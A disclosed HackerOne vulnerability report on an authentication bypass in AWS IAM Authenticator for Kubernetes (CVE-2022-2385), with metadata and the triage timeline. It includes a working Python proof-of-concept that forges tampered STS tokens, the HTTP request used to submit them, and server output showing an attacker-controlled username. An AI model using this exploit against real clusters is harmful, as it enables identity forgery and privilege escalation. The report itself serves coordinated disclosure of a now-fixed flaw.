---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/cloud
  - stack/kubernetes
  - stack/aws
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2023-05-25
submitted: 2022-05-24T19:37:58.077Z
bounty_usd: 2500
votes: 68
cve: []
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "0ria"
source: "https://hackerone.com/reports/1580493"
title: "Bypass validation parts in AWS IAM Authenticator for Kubernetes"
---
# Bypass validation parts in AWS IAM Authenticator for Kubernetes

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 68 | **Program:** Kubernetes | **Disclosed:** 2023-05-25

- Report: [https://hackerone.com/reports/1580493](https://hackerone.com/reports/1580493)
- CWE: Improper Authentication - Generic
- Submitted: 2022-05-24T19:37:58.077Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Whenever the aws-iam-authenticator server gets a POST request to /authenticate it extracts the token and validates it. The token's content is a signed AWS STS request to the GetCallerIdentity endpoint, where the response content is used to map to matching K8s identity (username, groups).

I found several bypasses to validation parts in [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator):
1. It is possible to craft a token **without signed cluster ID header** and use it for replay attacks.
2. It is possible to manipulate the extracted **AccessKeyID**. Since the AccessKeyID value [can be used as part of the identity](https://github.com/kubernetes-sigs/aws-iam-authenticator#:~:text=%23%20If%20unalterable%20identification%20of%20an%20IAM%20User%20is%20desirable%2C%20you%20can%20map%20against%0A%20%20%23%20AccessKeyID.), it allows an attacker to gain hight permissions in the cluster.
3. It is possible to send a request to other action values (not only GetCallerIdentity). Since I couldn't find a way to control the host or add other parameters to the request, the impact of changing the action is low.

## Kubernetes Version:
all versions

## Component Version:
all versions. the issue seems to be there from [first commit](https://github.com/kubernetes-sigs/aws-iam-authenticator/commit/aeac2587d437da3751f3be8eb9a79a8311d33dd1#diff-b03d5162238d36a569ac0c110484bf356f617e22967aeb1af853b02993da60b8R141).

## Steps To Reproduce:
1. Create a K8s cluster with [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator) as auth webhook.
(I run the aws-iam-authenticator server locally on my machine using the command `aws-iam-authenticator server -c config.yaml`)
2. You can use the python script below to generate all types of malicious tokens. change the CLUSTER_ID value before running.

```python
import base64
import boto3
import re
from botocore.signers import RequestSigner

REGION = 'us-east-1'
CLUSTER_ID = 'gaf-cluster'


def get_bearer_token(url, headers):
    STS_TOKEN_EXPIRES_IN = 60
    session = boto3.session.Session()

    client = session.client('sts', region_name=REGION)
    service_id = client.meta.service_model.service_id

    signer = RequestSigner(
        service_id,
        REGION,
        'sts',
        'v4',
        session.get_credentials(),
        session.events
    )

    params = {
        'method': 'GET',
        'url': url,
        'body': {},
        'headers': headers,
        'context': {}
    }

    signed_url = signer.generate_presigned_url(
        params,
        region_name=REGION,
        expires_in=STS_TOKEN_EXPIRES_IN,
        operation_name=''
    )

    return signed_url


def base64_encode_no_padding(signed_url):
    base64_url = base64.urlsafe_b64encode(signed_url.encode('utf-8')).decode('utf-8')

    # remove any base64 encoding padding:
    return 'k8s-aws-v1.' + re.sub(r'=*', '', base64_url)


def create_mal_token_with_other_action(action_name):
    url = f'https://sts.{REGION}.amazonaws.com/?Action={action_name}&Version=2011-06-15&action=GetCallerIdentity'
    headers = {'x-k8s-aws-id': CLUSTER_ID}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace(f'&action=GetCallerIdentity', '')
    signed_url += f'&action=GetCallerIdentity'

    return base64_encode_no_padding(signed_url)


def create_mal_token_without_cluster_id_header_signed():
    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-signedheaders=x-k8s-aws-id'
    headers = {}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace('&x-amz-signedheaders=x-k8s-aws-id', '')
    signed_url += '&x-amz-signedheaders=x-k8s-aws-id'

    return base64_encode_no_padding(signed_url)


def create_mal_token_with_other_access_key(value):
    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-credential={value}'
    headers = {'x-k8s-aws-id': CLUSTER_ID}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace(f'&x-amz-credential={value}', '')
    signed_url += f'&x-amz-credential={value}'

    return base64_encode_no_padding(signed_url)


print("Token with other action:")
print(create_mal_token_with_other_action('GetSessionToken'))

print("Token without cluster id header signed:")
print(create_mal_token_without_cluster_id_header_signed())

print("Token with other value as access key:")
print(create_mal_token_with_other_access_key('some-other-value'))
``` 

3. Choose a token and send the HTTP request below to the aws-iam-authenticator server:
```
POST /authenticate HTTP/1.1
Host: 127.0.0.1:21362
Content-Length: 563

{"Spec":{"Token":"<token-value>"}}
```
Note: You might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times. the reason is explained in the root cause section.

4. View the output of the server and the request:
* If you chose the "other action" token, if the action is valid STS action (such as GetSessionToken) the server will log the following error message: 
*"sts getCallerIdentity failed: arn '' is invalid: 'arn: invalid prefix'".*
If the action is invalid STS action (such as CreateUser) the server will log the following error message:
*"sts getCallerIdentity failed: error from AWS (expected 200, got 400). Body: {\"Error\":{\"Code\":\"InvalidAction\",\"Message\":\"Could not find operation CreateUser for version 2011-06-15\",\"Type\":\"Sender\"},\"RequestId\":\"0037e282-007f-453c-0017-a0acde0b9b00\"}"*

* If you chose the "no signed cluster id header" token, the server will act regularly and will map the arn from the STS response. Note that if requests are being passed through burp, you can send the STS request that was sent by the server to the repeater and delete the "X-K8s-Aws-Id" header and its value.

* If you chose the "other value as access key", the server will log the injected value as the access key "accesskeyid=some-other-value"
In this case, it is possible to trick the mapping. Create the following mapping in the aws-iam-authenticator server config:
```yaml
  mapUsers:
  - userARN: arn:aws:iam::000000000000:user/Alice
    username: user:{{AccessKeyID}}
    groups:
    - test
```
Resent the request with the token and the server will respond with:
```json
{"metadata":{"creationTimestamp":null},"spec":{},"status":{"authenticated":true,"user":{"username":"user:some-other-value","uid":"aws-iam-authenticator:<aws-account-id>:<aws-user-id>","groups":["test"],"extra":{"accessKeyId":["some-other-value"],"arn":["arn:aws:iam::<aws-account-id>:user/<aws-username>"],"canonicalArn":["arn:aws:iam::<aws-account-id>:user/<aws-user-name>"],"sessionName":[""]}}}}
```
The final K8s username was controlled by the attacker.

## Root Cause:
All the specified issues happens because of [this code line](https://github.com/kubernetes-sigs/aws-iam-authenticator/blob/master/pkg/token/token.go#L483)
```go
	for key, values := range queryParams {
		if !parameterWhitelist[strings.ToLower(key)] {
			return nil, FormatError{fmt.Sprintf("non-whitelisted query parameter %q", key)}
		}
		if len(values) != 1 {
			return nil, FormatError{"query parameter with multiple values not supported"}
		}
		queryParamsLower.Set(strings.ToLower(key), values[0])
	}
```
It allows an attacker to send two variables with the same name (but with different uppercase, lowercase characters). For example "Action" and "action".
Since both are being "ToLower", the value in the queryParamsLower dictionary will be overriden while the request to AWS will be sent with both values (sts.amazonaws.com will ignore the other parameter).

Because the for loop is not ordered, the parameters are not always overriden in the order we want, therefore we might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times.

## Impact

An attacker can bypass parts in the authentication and authorization checks that might control the values of the K8s *username* and *groups* during the mapping. This can help an attacker to gain higher permissions in the K8s cluster.

## Timeline

- **Report Filed**
- **2022-05-30** @h1_analyst_amey: Hi @gaffy,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@forest_dweller
- **2022-05-30** @h1_analyst_amey: Hi @gaffy,

We would like to inform you that we are going to take longer than usual to triage this report owing to setup required for the issue. We will let you know as soon as we have an update for you.

Please bear with us in the meantime. Thank you for your patience.

Cheers,
@forest_dweller
- **2022-06-01** @h1_analyst_amey: Hi @gaffy,

Just letting you know that we are still in the process of validating your report. Thank you for your patience.

Cheers,
@forest_dweller
- **2022-06-01** @0ria: Hi @forest_dweller, 

Thank you for the updates.
- **2022-06-03** @0ria: Vulnerability was validated by AWS.
Following their request for CVE details: Gafnit Amiga from Lightspin.

Have a great weekend!
- **Report Severity Updated**
- **2022-06-13** @mhausler: Hi Gafnit,

We're treating this as an [Tier 2](https://hackerone.com/kubernetes?type=team) [High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N). I need to allocate a 2022 block of CVE IDs for Kubernetes and then I'll reserve one and let you know the ID for this issue.

AWS is rolling out the fix you validated, and this will go through the rest of the month. As we get closer to the fix being deployed, I'll be in touch about a disclosure date, but it'll likely be early July.

Thank you!
- **2022-06-14** @0ria: Hi Micah, thank you for the update and severity correction.
- **2022-07-11** @mhausler: Hi Gafnit, we've allocated CVE-2022-2385 for this issue
- **Bounty Awarded**
- **2022-11-22** @0ria: Thank you for the reward!
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
